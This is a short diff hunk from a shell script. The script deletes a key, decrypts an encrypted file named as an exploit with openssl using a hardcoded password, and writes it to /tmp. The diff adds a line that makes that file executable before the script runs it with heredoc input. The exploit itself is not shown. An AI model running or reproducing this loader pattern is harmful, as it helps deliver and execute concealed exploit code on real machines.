@@ -17,8 +17,9 @@ echo "Key found."
 
 echo "Deleting key."
 rm -rf $key
-echo "Decrypting exploit."
+echo "Decrypting and preparing exploit."
 openssl des3 -d -in "$res/exp.out.des3" -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out
+chmod +x /tmp/exp.out
 
 echo "Doing work."
 /tmp/exp.out <<'EOF'
